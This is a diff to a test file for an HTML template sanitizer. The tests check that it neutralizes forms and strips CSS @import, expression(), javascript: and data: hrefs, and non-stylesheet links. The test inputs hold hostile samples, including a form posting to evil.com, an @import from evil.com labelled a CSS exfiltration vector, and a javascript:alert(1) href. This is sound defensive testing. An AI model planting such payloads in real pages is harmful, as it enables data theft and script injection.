@@ -56,11 +56,14 @@ describe("sanitizeTemplateHtml", () => {
     expect(result).not.toContain("javascript:");
   });
 
-  it("removes form tags", () => {
-    const html = `<form><input name="email"></form><div>{{FORM_SLOT}}</div>`;
+  it("neutralizes custom form tags (removes action/method, adds marker)", () => {
+    const html = `<form action="https://evil.com" method="POST"><input name="email"></form><div>{{FORM_SLOT}}</div>`;
     const result = sanitizeTemplateHtml(html);
-    expect(result).not.toContain("<form");
-    expect(result).not.toContain("<input");
+    // Form é preservado (feature de forms customizados) mas neutralizado
+    expect(result).toContain("data-vortex-custom-form");
+    expect(result).not.toContain("action=");
+    expect(result).not.toContain("method=");
+    expect(result).not.toContain("https://evil.com");
   });
 
   it("removes object and embed tags", () => {
@@ -109,17 +112,59 @@ describe("sanitizeTemplateHtml", () => {
     expect(result).toContain("[REDACTED]");
   });
 
-  it("preserves style tags", () => {
+  it("preserves style tags (CSS sanitizado)", () => {
     const html = `<style>.hero { color: red; }</style><div class="hero">{{FORM_SLOT}}</div>`;
     const result = sanitizeTemplateHtml(html);
-    expect(result).toContain(".hero");
-    expect(result).toContain("color: red");
+    expect(result).toContain("<style>");
+    expect(result).toContain(".hero { color: red; }");
+    // CSS inline (atributo style) continua permitido
+    expect(sanitizeTemplateHtml(`<div style="color: red">{{FORM_SLOT}}</div>`)).toContain("style=\"color: red\"");
   });
 
-  it("preserves link stylesheets", () => {
+  it("removes @import from style tags (vetor de exfiltração via CSS)", () => {
+    const html = `<style>@import url("https://evil.com/x.css"); .hero { color: red; }</style><div>{{FORM_SLOT}}</div>`;
+    const result = sanitizeTemplateHtml(html);
+    expect(result).not.toContain("@import");
+    expect(result).not.toContain("evil.com");
+    // CSS legítimo preservado
+    expect(result).toContain(".hero { color: red; }");
+  });
+
+  it("removes expression() from style tags", () => {
+    const html = `<style>.x { width: expression(alert(1)); }</style><div>{{FORM_SLOT}}</div>`;
+    const result = sanitizeTemplateHtml(html);
+    expect(result).not.toContain("expression");
+  });
+
+  it("preserves link stylesheets with http/https href", () => {
     const html = `<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter"><div>{{FORM_SLOT}}</div>`;
     const result = sanitizeTemplateHtml(html);
     expect(result).toContain("fonts.googleapis.com");
+    expect(result).toContain('rel="stylesheet"');
+  });
+
+  it("preserves link stylesheets with http (MinIO/VPS sem https)", () => {
+    const html = `<link rel="stylesheet" href="http://minio.vps.local:9000/estilos.css"><div>{{FORM_SLOT}}</div>`;
+    const result = sanitizeTemplateHtml(html);
+    expect(result).toContain("minio.vps.local");
+  });
+
+  it("removes link stylesheets with javascript: href", () => {
+    const html = `<link rel="stylesheet" href="javascript:alert(1)"><div>{{FORM_SLOT}}</div>`;
+    const result = sanitizeTemplateHtml(html);
+    expect(result).not.toContain("javascript:");
+  });
+
+  it("removes link stylesheets with data: href", () => {
+    const html = `<link rel="stylesheet" href="data:text/css,body{display:none}"><div>{{FORM_SLOT}}</div>`;
+    const result = sanitizeTemplateHtml(html);
+    expect(result).not.toContain("data:text/css");
+  });
+
+  it("removes non-stylesheet link tags", () => {
+    const html = `<link rel="preload" href="https://evil.com/x.js"><div>{{FORM_SLOT}}</div>`;
+    const result = sanitizeTemplateHtml(html);
+    expect(result).not.toContain("evil.com");
   });
 
   it("preserves img tags with safe attributes", () => {
@@ -135,12 +180,15 @@ describe("sanitizeTemplateHtml", () => {
     expect(result).not.toContain("data:image");
   });
 
-  it("preserves {{FORM_SLOT}} even when inside a removed tag wrapper", () => {
-    // {{FORM_SLOT}} é texto puro, sobrevive à remoção da tag pai
+  it("preserves {{FORM_SLOT}} even when inside a neutralized form wrapper", () => {
+    // {{FORM_SLOT}} é texto puro, sobrevive mesmo dentro de um form neutralizado
     const html = `<form>{{FORM_SLOT}}</form>`;
     const result = sanitizeTemplateHtml(html);
     expect(result).toContain("{{FORM_SLOT}}");
-    expect(result).not.toContain("<form");
+    // form é neutralizado (marcador adicionado, sem action/method)
+    expect(result).toContain("data-vortex-custom-form");
+    expect(result).not.toContain("action=");
+    expect(result).not.toContain("method=");
   });
 });
 
